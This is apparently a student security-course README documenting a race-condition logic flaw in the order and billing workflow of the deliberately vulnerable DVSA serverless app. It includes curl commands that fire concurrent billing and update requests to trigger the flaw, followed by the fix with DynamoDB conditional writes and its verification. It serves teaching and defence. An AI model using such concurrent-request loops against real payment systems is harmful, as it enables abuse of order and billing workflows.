# Lesson #8: Logic Vulnerabilities

## ICS-344 Information Security — DVSA Vulnerability Report

This README documents **Lesson #8: Logic Vulnerabilities** from the Damn Vulnerable Serverless Application (DVSA) project. The vulnerability demonstrates a race-condition-style business logic flaw in the order workflow, where billing and update operations can conflict when they are executed close together.

> **Course:** ICS-344 — Information Security  
> **Section:** 02  
> **AWS Region:** us-east-1 (N. Virginia)  
> **Application:** OWASP Damn Vulnerable Serverless Application (DVSA)  
> **Lesson:** #8 — Logic Vulnerabilities  
> **Date:** 19 April 2026

---

## 1. Vulnerability Summary

The goal of this lesson is to demonstrate a **logic vulnerability** caused by weak workflow/state enforcement in the DVSA order process.

In the intended workflow, an order should move through a controlled sequence:

1. Order is created
2. Order may be updated while still open
3. Billing is performed
4. Order transitions to a paid/finalized state
5. Further conflicting updates should be rejected

The vulnerable behavior occurs because the backend does not strongly enforce state transitions at the beginning of each sensitive operation. As a result, concurrent `billing` and `update` requests can interact with the same order in a timing-sensitive way.

---

## 2. Root Cause

The root cause is weak server-side workflow control.

Main issues:

- Order state transitions were not enforced strictly enough
- Billing and update operations could be processed close together
- The backend reacted after the order state had already advanced
- No strong atomic condition prevented conflicting workflow transitions
- DynamoDB conditional writes were not used consistently to protect state changes

This means the backend could return responses such as:

```json
{"status":"err","msg":"order already paid"}
```

or:

```json
{"status":"err","msg":"order already made"}
```

These responses show that the system detected the invalid state only after progression had already occurred, rather than preventing the conflict at the start.

---

## 3. Environment and Setup

### AWS Services Involved

- Amazon API Gateway
- AWS Lambda
  - `DVSA-ORDER-MANAGER`
  - `DVSA-ORDER-UPDATE`
  - `DVSA-ORDER-BILLING`
- Amazon DynamoDB
- Amazon SQS
- Amazon CloudWatch

### Tools Used

- Kali Linux terminal
- `curl`
- `jq`
- Browser DevTools
- AWS Console
- CloudWatch Logs

### Environment Variables

Use placeholders for sensitive values:

```bash
export API="https://<API_ID>.execute-api.us-east-1.amazonaws.com/dvsa/order"
export TOKEN_B="<YOUR_VALID_JWT>"
```

> Do not commit real JWTs, AWS credentials, session tokens, or account secrets to GitHub.

---

## 4. Reproduction Steps

### Step 1 — Create a Fresh Order

```bash
curl -s "$API" \
-H "content-type: application/json" \
-H "authorization: $TOKEN_B" \
--data-raw '{"action":"new","cart-id":"race-test","items":{"1":1}}' | jq
```

Observed result:

```json
{
  "status": "ok",
  "msg": "order created",
  "order-id": "<ORDER_ID>"
}
```

Save the returned order ID:

```bash
export ORDER_ID="<ORDER_ID>"
```

---

### Step 2 — Update the Order

```bash
curl -s "$API" \
-H "content-type: application/json" \
-H "authorization: $TOKEN_B" \
--data-raw '{"action":"update","order-id":"'$ORDER_ID'","items":{"1":1}}' | jq
```

Expected result:

```json
{
  "status": "ok",
  "msg": "cart updated"
}
```

---

### Step 3 — Confirm Billing Works

```bash
curl -s "$API" \
-H "content-type: application/json" \
-H "authorization: $TOKEN_B" \
--data-raw '{"action":"billing","order-id":"'$ORDER_ID'"}' | jq
```

Expected result:

```json
{
  "status": "ok",
  "amount": 100,
  "token": "<PAYMENT_TOKEN>",
  "missing": {}
}
```

---

### Step 4 — Trigger the Race Condition

```bash
for i in {1..5}; do
(
curl -s "$API" \
-H "content-type: application/json" \
-H "authorization: $TOKEN_B" \
--data-raw '{"action":"billing","order-id":"'$ORDER_ID'"}' &

curl -s "$API" \
-H "content-type: application/json" \
-H "authorization: $TOKEN_B" \
--data-raw '{"action":"update","order-id":"'$ORDER_ID'","items":{"1":1}}'
)
done
wait
```

Observed vulnerable behavior before the fix included mixed state-based responses such as:

```json
{"status":"err","msg":"order already paid"}
{"status":"err","msg":"order already made"}
```

This confirms timing-sensitive behavior in the order workflow.

---

## 5. Evidence and Proof

The vulnerability was supported by the following evidence:

- A new order was created successfully
- The order was updated successfully
- Billing succeeded normally
- Concurrent billing and update requests produced mixed state-based responses
- The backend returned messages such as:
  - `order already paid`
  - `order already made`

This proves that competing operations could interact with the same order before strict state enforcement occurred.

### Evidence Screenshots

Add your screenshots in an `evidence/` folder and reference them here:

| Figure | Description |
|---|---|
| Figure 1 | Create order |
| Figure 2 | Prepare/update order |
| Figure 3 | Confirm billing |
| Figure 4 | Race-condition exploit output |
| Figure 5 | Exploit after fix |

Suggested folder structure:

```text
/evidence
  figure-1-create-order.png
  figure-2-update-order.png
  figure-3-billing.png
  figure-4-race-condition.png
  figure-5-after-fix.png
```

---

## 6. Security Impact

This vulnerability affects workflow integrity and business logic.

Potential impacts include:

- Conflicting order states
- Payment workflow abuse
- Unauthorized or invalid state transitions
- Inconsistent order data
- Business process manipulation

In serverless systems, this is important because different Lambda functions may process different parts of the workflow. If the shared order state is not protected atomically, attackers can abuse timing gaps between functions.

---

## 7. Fix Strategy / Mitigation

The correct mitigation is to enforce strict server-side state transitions.

Required protections:

- Allow `update` only while the order is still open
- Allow `billing` only while the order is still open
- Reject updates after billing begins or completes
- Use DynamoDB conditional writes to enforce state atomically
- Reject conflicting transitions before the order progresses

The key principle is:

> Validate and commit workflow state atomically.

---

## 8. Code / Configuration Changes

### Fix in `DVSA-ORDER-UPDATE`

The update function should require the order to be in an open state before allowing modification.

Example logic:

```python
if current_status != 100:
    return {
        "status": "err",
        "msg": "invalid state transition"
    }
```

DynamoDB update should include a condition:

```python
ConditionExpression='orderStatus = :expectedStatus'
```

---

### Fix in `DVSA-ORDER-BILLING`

The billing function should also verify that the order is still open before committing payment.

Example logic:

```python
if status != 100:
    return {
        "status": "err",
        "msg": "invalid state transition"
    }
```

DynamoDB conditional update:

```python
ConditionExpression='orderStatus = :expectedStatus'
```

This prevents two competing operations from both succeeding when only one valid transition should be allowed.

---

## 9. Verification After Fix

After applying the fix, the same race-condition test was repeated.

Expected post-fix response:

```json
{"status":"err","msg":"invalid state transition"}
```

This confirms that:

- Conflicting workflow operations are rejected
- Order state is enforced server-side
- Timing-sensitive updates no longer bypass workflow rules
- The backend prevents invalid transitions before committing changes

---

## 10. Structured Operation and Security Analysis

### Table A — Intended Behavior vs. Exploit Behavior

| Vulnerability | Intended Rule(s) | Artifacts Used to Infer Rule | Normal Behavior Evidence | Exploit Behavior Evidence |
|---|---|---|---|---|
| Logic Vulnerability / Race Condition | An order should move through a controlled sequence. Update is only allowed while the order is open. Billing should finalize payment once and prevent conflicting concurrent transitions. | API requests, terminal output, Lambda workflow, DynamoDB-backed order state, CloudWatch logs | `new` returned `order created`; `update` returned `cart updated`; `billing` returned success with amount/token | Concurrent requests produced timing-sensitive responses such as `order already paid` and `order already made`, showing weak sequencing before fix |

### Table B — Deviation and Fix

| Vulnerability | Why This Is a Deviation | Deviation Class | Fix Applied | Post-Fix Verification |
|---|---|---|---|---|
| Logic Vulnerability / Race Condition | The backend allowed competing workflow operations to interact with the same order before strict state enforcement occurred. The system reacted after state progression instead of preventing invalid transitions at the start. | Intentional misuse / security-relevant abuse | Added strict `orderStatus == 100` checks and DynamoDB conditional updates in `DVSA-ORDER-UPDATE` and `DVSA-ORDER-BILLING` | Re-running the race produced `invalid state transition`, showing that the server now rejects conflicting requests |

---

## 11. Takeaway / Lessons Learned

This lesson shows that security is not limited to authentication and input validation. Workflow integrity is also critical.

In serverless systems, multiple functions may interact with the same backend state. If state transitions are not enforced atomically, attackers can abuse timing gaps between operations.

The main lesson is:

> Server-side workflow rules must be enforced strictly, and state transitions must be protected with atomic conditional updates.

---

## 12. Safety Notice

This work was performed only in a controlled DVSA lab environment for ICS-344 educational purposes. Do not test these techniques against systems that you do not own or have explicit permission to assess.
